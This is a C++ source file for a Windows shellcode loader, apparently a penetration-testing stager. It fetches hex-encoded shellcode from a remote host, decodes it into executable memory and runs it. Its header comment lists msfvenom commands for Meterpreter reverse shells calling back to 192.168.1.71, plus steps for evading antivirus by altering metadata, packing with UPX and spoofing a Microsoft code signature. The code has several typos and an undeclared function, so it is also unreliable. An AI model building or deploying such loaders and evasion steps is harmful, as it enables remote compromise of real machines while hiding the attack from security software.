#include<windows.h>
#include<string.h>
#include<stdio.h>
#include<iostream>


/*
Credits: https://www.countercept.com/blog/dynamic-shellcode-execution/
msfvenom –p windows/meterpreter/reverse_https LHOST=192.168.1.71 LPORT=666 -e x86/shikata_ga_nai -i 20 -n 10 –f c -o chars.raw
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.71 LPORT=666 --encrypt rc4 --encrypt-key thisisakey -f c -o chars.raw
https://stackoverflow.com/questions/284258/how-do-i-set-the-version-information-for-an-existing-exe-dll
Meta-Data Alteration: ResourceHacker.exe -open $N4m.exe -save compiled-$N4m.exe -action addoverwrite -resource.rc resources.res
Pack executable using UPX: upx -9 -v -o $NaM.exe input_name.exe
ParanoidNinja (CarbonCopy): https://github.com/paranoidninja/CarbonCopy
Signs an Executable for AV Evasion (carboncopy): python3 CarbonCopy.py www.microsoft.com 443 $NaM.exe signed-$NaM.exe
*/


using std::string;
#pragma commant(lib, "w32_32.lib")

HINSTANCE hInst;
WSADATA wsaData;
void mParseUrl(char *mUrl, string &serverName, string &filepath, string &filename);
SOCKET connectToServer(char *szServerName, WORD portNum);
int getHeaderLength(char *szUrl, long &bytesReturnedOut, char **headerOut);

int main()
{
       const int bufLen = 1024;
       char *szUrl = "http://$lhost/chars.raw"
       long fileSize;
       char *memBuffer, *headerBuffer;
       FILE *fp;

       memBuffer = headerBuffer = NULL;

       if (WSAStartup(0x101, &wsaData) != 0)
               return -1;

       memBuffer = readUrl2(szUrl, fileSize, &headrBuffer);
       if (fileSize != 0)
       {
              /* fp = fopen("downloaded.file", "wb"); */
              fp = fopen("chars.raw", "wb");
              fwrite(memBuffer, 1, fileSize, fp);
              fclose(fp);
              delete(headerBuffer);
       }
       int code_length = strlen(memBuffer);

       unsigned char* val = (unsigned char*)calloc(code_length / 2, sizeof(unsigned char));
       for (size_t count = 0; count < code_length / 2; count++) {
              sscanf(memBuffer, "%2hhx", &val[count]);
              memBuffer += 2;
        }

        void *exec = virtualAlloc(0, code_length/2, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        memcpy(exec, val, code_length/2);
        ((void(*)())exec)();
        WSACleanup();
        return 0;
}
